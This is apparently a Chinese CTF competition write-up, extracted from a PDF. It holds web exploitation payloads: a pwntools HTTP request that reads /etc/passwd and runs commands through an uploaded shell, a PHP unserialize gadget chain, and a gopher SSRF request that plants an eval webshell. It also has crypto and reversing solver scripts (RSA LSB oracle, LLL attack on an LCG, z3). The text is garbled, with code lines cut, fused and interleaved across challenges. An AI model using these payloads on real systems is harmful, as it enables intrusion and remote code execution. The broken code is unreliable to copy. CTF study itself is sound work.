(KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36
Accept: 
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;
q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
'''
    body = body.replace("\n","\r\n")
    print(body)
    p = remote('39.99.249.211',80)
    p.send(body)
    print(p.recvuntil('root:x:0:').decode("utf-8").replace('HTTP/1.1 200 
OK',''))
#get shell_dir
#upload_shell()
shell_dir = '/tmp/httpd-19-36420-1.tmp'
excute_cmd("ls -al /",shell_dir)
一个算法题，而且有回答时间限制
发现在较短时间内，启用两次通讯得到的题目一样
所以可以利用A B两次通讯，A里面随便输入个answer，等待返回correct answer，然后再发送给B。
在时间限制内答对就可拿到ﬂag，可以写个脚本操作。
age;
        $boy = $this->sex;
        $a = $this->num;
    $student->$boy();
    if(!(is_string($a)) ||!(is_string($boy)) || !(is_object($student)))
    {
        ob_end_clean();
        exit();
    }
    global $$a;
    $result=$GLOBALS['flag'];
        ob_end_clean();
    }
}
if (isset($_GET['x'])) {
    unserialize($_GET['x'])->get_it();
} 
age = $age;
        $this->sex = $sex;
        $this->num = $num;
    }
}
$data = new User(new Pass(), "read", "result");
$data2 = new User(new Pass(), "read", "this");
$payload = array($data, $data2, "AAAA");
$aaa = serialize($payload);
echo $aaa;
dice2cry
http://106.14.66.189/
abi.php.bak拿到源码 需要post ”this_is.able“ 然后就是简单的lsb_oracle了
https://bugs.php.net/bug.php?id=78236
http://39.98.131.124/ssrf.php?
we_have_done_ssrf_here_could_you_help_to_continue_it=gopher%3A%2F%2F172.26.98.14
7%3A40000%2F_%250D%250APOST%2520%2Findex.php%2520HTTP%2F1.1%250D%250AHost%253A%2
520172.26.98.147%253A40000%250D%250AContent-Length%253A%252098%250D%250ACache-
Control%253A%2520max-age%253D0%250D%250AUpgrade-Insecure-
Requests%253A%25201%250D%250AOrigin%253A%2520http%253A%2F%2F39.98.131.124%250D%2
50AContent-Type%253A%2520application%2Fx-www-form-urlencoded%250D%250AUser-
Agent%253A%2520Mozilla%2F5.0%2520%2528Macintosh%253B%2520Intel%2520Mac%2520OS%25
20X%252010_15_5%2529%2520AppleWebKit%2F537.36%2520%2528KHTML%252C%2520like%2520G
ecko%2529%2520Chrome%2F84.0.4147.135%2520Safari%2F537.36%250D%250AAccept%253A%25
20text%2Fhtml%252Capplication%2Fxhtml%252Bxml%252Capplication%2Fxml%253Bq%253D0.
9%252Cimage%2Fwebp%252Cimage%2Fapng%252C%252A%2F%252A%253Bq%253D0.8%252Capplicat
ion%2Fsigned-
exchange%253Bv%253Db3%253Bq%253D0.9%250D%250AReferer%253A%2520http%253A%2F%2F39.
98.131.124%2Fssrf.php%253Fwe_have_done_ssrf_here_could_you_help_to_continue_it%2
53Dhttp%253A%2F%2F172.26.98.147%253A40000%2F%250D%250AAccept-
Encoding%253A%2520gzip%252C%2520deflate%250D%250AAccept-Language%253A%2520zh-
CN%252Czh%253Bq%253D0.9%250D%250AConnection%253A%2520close%250D%250ACookie%253A%
2520PHPSESSID%253Dvenenof7nu1l%250D%250A%250D%250Afile%253Dphp%253A%2F%2Ffilter%
2Fconvert.base64-
decode%2Fresource%25253dveneno.php%2526content%253DPD89ZXZhbCgkX0dFVFthXSk7Pz4%2
50D%250A
import requests
from Crypto.Util.number import long_to_bytes
cookies = {"encrypto_flag": 
"4546593284002117386634437404315529363646392866484411505081746689996849379636592
12950676706194348250350985177553258626717404579151315056197434716077885765225292
55405963716574716340068991859916399126104350875134633281427848875445521065486773
000031435475730637962621247290102064106118177042608671128815440530946",
           "PHPSESSID": "ekvrifngfb1s8c79823kllfaau", "public_n": 
"8f5dc00ef09795a3efbac91d768f0bff31b47190a0792da3b0d7969b1672a6a6ea572c2791fa6d0
da489f5a7d743233759e8039086bc3d1b28609f05960bd342d52bffb4ec22b533e1a75713f4952e9
075a08286429f31e02dbc4a39e3332d2861fc7bb7acee95251df77c92bd293dac744eca3e6690a7d
8aaf855e0807a1157", "public_e": "010001"}
n = 
0x8f5dc00ef09795a3efbac91d768f0bff31b47190a0792da3b0d7969b1672a6a6ea572c2791fa6d
0da489f5a7d743233759e8039086bc3d1b28609f05960bd342d52bffb4ec22b533e1a75713f4952e
9075a08286429f31e02dbc4a39e3332d2861fc7bb7acee95251df77c92bd293dac744eca3e6690a7
d8aaf855e0807a1157
e = 0x10001
c = 
45465932840021173866344374043155293636463928664844115050817466899968493796365921
29506767061943482503509851775532586267174045791513150561974347160778857652252925
54059637165747163400689918599163991261043508751346332814278488754455210654867730
00031435475730637962621247290102064106118177042608671128815440530946
Re
aaenc
def oracle(c):
    global last
    m = requests.post("http://106.14.66.189/abi.php", data={'this[is.able': c}, 
cookies=cookies).json()['num']
    return m
L, H, R = 0, 1, 1
s = 1
while True:
    s = s * pow(3, e, n) % n
    m = oracle(s * c % n)
    L, H, R = 3 * L, 3 * H, 3 * R
    if m == 0:
        H -= 2
    elif m == (-n % 3):
        L += 1
        H -= 1
    else:
        L += 2
    if (n * H // R) - (n * L // R) >64)[2:].zfill(16)
    except Exception as e:
        return "0"*16
console:setTitle("aaenc")
local flag = console:getText("Input flag:")
local seed = console:getText("Input key:")
if string:len(seed) ~= 32 then
  console:log("wrong key length")
else
  console:log("aaenc your flag: " .. flag .. " with key: " .. seed .. " ......")
  local pyCode = "def getr(m,a,b,s,c):\r\n    try:\r\n        
assert(len(s))==32\r\n        mt=int(m,16)\r\n        at=int(a,16)\r\n        
bt=int(b,16)\r\n        st=int(s,16)\r\n        for _ in range(int(c)):\r\n      
      st=(at*st+bt)%mt\r\n        return hex(st>>64)[2:].zfill(16)\r\n    except 
Exception as e:\r\n        return \"0\"*16\r\n\t"
LLL恢复LCG的seed，然后aes解密即可
  local m = "e542d091540eae43c96d0ae3f4a10d81"
  local a = "ccec1dce142a4582d9af626863c6ee7d"
  local b = "89d6db1518eb7f00093ae5f419523b8c"
  py:exec(pyCode)
  local writelog = ""
  local i = py
  for i = 1, 20 do
    writelog = writelog .. crypt.bin:decodeHex(tostring(nil, py.main:getr(m, a, 
b, seed, i)))
  end
  string:save("log", writelog)
  local aesiv = crypt.bin:decodeHex(tostring(writelog, py.main:getr(m, a, b, 
seed, 21)) + tostring(py.main:getr(m, a, b, seed, 22)))
  local aeskey = crypt.bin:decodeHex(tostring(py.main:getr(m, a, b, seed, 23)) + 
tostring(py.main:getr(m, a, b, seed, 24)))
  local aes = crypt:aes()
  aes:setPassword(aeskey)
  aes:setInitVector(aesiv)
  local cipher = aes:encrypt(flag)
  local output = crypt.bin:encodeBase64(cipher)
  console:log(output)
  string:save("output", output)
end
console:pause()
from Crypto.Cipher import AES
import base64
from binascii import unhexlify
b=183219830469466877760231168067257908108
a=272388497715857844567506303786466864765
m=304740132882704646362913693640465386881
def getr(mt, at, bt, st, c):
    try:
        for _ in range(int(c)):
            st = (at*st+bt) % mt
        return hex(st >> 64)[2:].zfill(16)
    except Exception as e:
        print(e)
        return "0"*16
h = [0, 0x9CE1BC6E7E93BC03, 0x47489FE35F5C92F1, 0x4B536E19E9F21A3B, 
0x42C7F93A6950BE21, 0xB238E656108693B2, 0x5F30DC294E45A73C, 0x27CCDC683B5BAD86, 
0x090D7235588C386E, 0x9764EBE232521ADF, 0x522A24F6FC7F08BC, 0xB8E85141140B6DC3, 
0x824E8FFBB1522F25, 0x051B2D968B1E7843, 0x30C5EB488D4F9748, 0x13094502337FB6B6, 
0x5319E03ABF8B0F54, 0xCFE90AA76014CE36, 0x29FAC4CCCE737DC6, 0x1FB257EBF0DAA9EC, 
0x9D5BF2FC7BEB9BCD]
for i in range(len(h)):
    h[i] <<= 64
A = [1]
B = [0]
for i in range(1, len(h)-1):
    A.append(a*A[i-1] % m)
    B.append((a*B[i-1]+a*h[i]+b-h[i+1]) % m)
ﬂower
首先修复混淆，然后从后往前逆推
A = A[1:]
B = B[1:]
M = matrix(ZZ, 21, 21)
for i in range(19):
    M[i, i] = m
    M[19, i] = A[i]
    M[20, i] = B[i]
    M[i, 19] = M[i, 20] = 0
M[19, 19] =  1
M[20, 20] = 2^64
M[19, 20]= 0
#print(B)
vl = M.LLL()[0]
l1 = vl[-2]
h1 = h[1]
s1 = l1+h1
#s1 = a*seed+b %m
seed = ((s1 - b)*inverse_mod(a,m))%m
print(seed)
IV = unhexlify(getr(m, a, b, seed, 21) + getr(m, a, b, seed, 22))
key = unhexlify(getr(m, a, b, seed, 23) + getr(m, a, b, seed, 24))
mode = AES.MODE_CBC
aes = AES.new(key, mode, IV=IV)
print(aes.decrypt(base64.b64decode('d34RauTjHiahhP/4pyNvh1g7s1gAs4dMzyDVBAOYBZvN
2cWVYqv0pCv2iyKSurH0')))
可以注意到操作对于z3来说很简单，但是轮数不确定，轮数由输入的crc决定，所以无法简单求出。
所以我们直接爆破轮数，求出轮数为20或28后，验证得知20为正确的轮数，即可直接z3求出ﬂag
from z3 import *
corr = 
'A8AF569888EF4006FDAEE99EB9EAAD52CCAB04CAECEB125499AABBCCDDEEFF00A8AF569888EF400
6FDAEE99EB9EAAD52CBAA19E5ECEB125EA0A6A8F38BD6CD6FCBC04FC1E0DA740091BEC683D0A68D2
EBEFC3FAD9BE02652F5BA94D1B4A2DF7CDAF86DFFFFE4740091BEC683D0A68D2EBEFC3FAD9BE0265
2F5BA94D1B4A2DF7C'.decode('hex')
corr = [c ^ 0x88 for c in map(ord, corr)]
def doRound(ctx, round):
    for m in range(round):
        v25 = 0
        v24 = v23 = ctx[7]
        while True:
            if v25 + 6 < 0:
                break
            v27 = ctx[6 + v25]
            ctx[7+v25] = (v23 & 0xf0) + (v27 & 0xf)
            v23 = v27
safe_m2m